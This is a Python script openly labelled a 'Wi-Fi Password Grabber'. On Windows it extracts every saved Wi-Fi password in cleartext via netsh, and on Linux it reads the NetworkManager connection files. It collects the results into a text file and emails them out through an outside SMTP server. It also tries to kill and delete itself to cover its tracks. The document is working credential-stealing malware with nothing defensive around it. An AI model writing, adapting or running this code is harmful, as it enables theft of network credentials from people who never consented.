import os
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import glob
import random
import shutil
import subprocess
import sys
import time
import urllib.request
import win32api
import win32con
import win32gui
import win32ui
import winreg
from win32api import GetSystemMetrics

sys_info = "Information.txt"

var = 2

YOUR_USERNAME = "YOUR_USERNAME"
YOUR_PASSWORD = "YOUR_PASSWORD"


file_path = os.getcwd()


def get_desktop():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
    return winreg.QueryValueEx(key, "Desktop")[0]


sender = "Private Person <from@example.com>"
receiver = "A Test User <to@example.com>"

message = f"""\
Subject: Hi Mailtrap
To: {receiver}
From: {sender}
Wi-Fi Password Grabber by Archisman Karmakar.\n"""


if os.name == "nt":
    # os.system("cls")
    output = subprocess.check_output("netsh wlan show profile", shell=True)
    # output = output.decode("utf-8")
    # output = output.split()
    # print(output)
    output = str(output)
    start = output.find("Profile :")
    end = output.split("\\r\\n")
    substring = output[start:end]
    words_list = output.split()
    jungkook = 2

    with open(file_path + "\\" + sys_info, "w") as f:
        f.write("All reg conns: \n")
        f.close()

    for wordblk in output.split():
        if wordblk == "Profile":
            next_word = words_list[words_list.index(wordblk) + jungkook]
            next_word = next_word.split("\\r\\n")[0]
            knj = jungkook + 1

            try:
                while "All" not in next_word:
                    next_word += " " + \
                        words_list[words_list.index(wordblk) + knj]
                    knj += 1
            except:
                pass

            next_word = next_word.split('\\r\\n')[0]

            if ':' in next_word:
                next_word = next_word.split(':')[1]

                if ' ' in next_word:
                    next_word = next_word.replace(' ', "")

            wifi = subprocess.check_output('netsh wlan show profile ' + '"' + next_word + '"' + ' key=clear',
                                           shell=True)

            wifi = str(wifi)
            start = wifi.find("Key Content")
            end = wifi.find("Cost settings")
            key_content = "Content"
            substring = wifi[start:end]
            words_list = wifi.split()
            with open(file_path + "\\" + sys_info, "a") as f:
                f.write(next_word + "\n")
                f.close()
            jungkook += 5

            try:
                next_word = words_list[words_list.index(key_content) + 2]
                i = 2
                for words in wifi.split():
                    if words == "Content":
                        next_word = words_list[words_list.index(
                            key_content) + i]
                        next_word = next_word.split('\\r\\n\\r\\nCost')[0]
                        next_word = next_word.replace(' ', "\\ ")
                        i += 5
                        with open(file_path + "\\" + sys_info, "a") as f:
                            f.write(" : " + next_word + "\n")
                            f.close()
            except:
                pass
    try:
        passwd = os.path.abspath(os.getcwd())
        os.system("cd " + passwd)
        os.system("TASKKILL /F /IM " + os.path.basename(__file__))
        print('File was closed.')

    # except OSError:
        os.system("DEL " + os.path.basename(__file__))
    except OSError:
        print('File is closed.')
        # pass

    with open(sys_info) as f:
        lines = f.read()
        #
        # print(str(lines))
    # message += str(lines)

    print(str(lines))
    message += str(lines)
    # print(message)

    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login(YOUR_USERNAME, YOUR_PASSWORD)
        server.sendmail(sender, receiver, message)


else:
    # non nt os code
    # os.system("chmod +x " + os.path.basename(__file__))
    with open(file_path + "/" + sys_info, "w") as f:
        f.write("All of Registered Connections :\n")
    try:
        output = glob.glob("/etc/NetworkManager/system-connections/*")

        res = [sub.replace(' ', "\ ") for sub in output]
        for i in res:
            output = subprocess.check_output("cat " + i, shell=True)
            output = str(output)
            with open(file_path + "/" + sys_info, "a") as f:
                f.write(output + "\n===========================\n")
    except:
        pass

    try:
        pwd = os.path.abspath(os.getcwd())
        os.system("cd " + pwd)
        # os.system("pkill " + os.path.basename(__file__))
        os.system('pkill leafpad')

        os.system("chattr -i " + os.path.basename(__file__))

        print('File was closed.')
        # os.system("rm -rf " + os.path.basename(__file__))

    except OSError:
        print('File is closed.')
        # pass

    f.close()
    with open(sys_info) as f:
        lines = f.read()
        #
        # print(str(lines))
    # message += str(lines)

    print(str(lines))
    message += str(lines)
    # print(message)

    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login(YOUR_USERNAME, YOUR_PASSWORD)
        server.sendmail(sender, receiver, message)

# os.system("rm -rf " + os.path.basename(__file__))

    # os.system("./" + os.path.basename(_file_))
os.remove("Informations.txt")
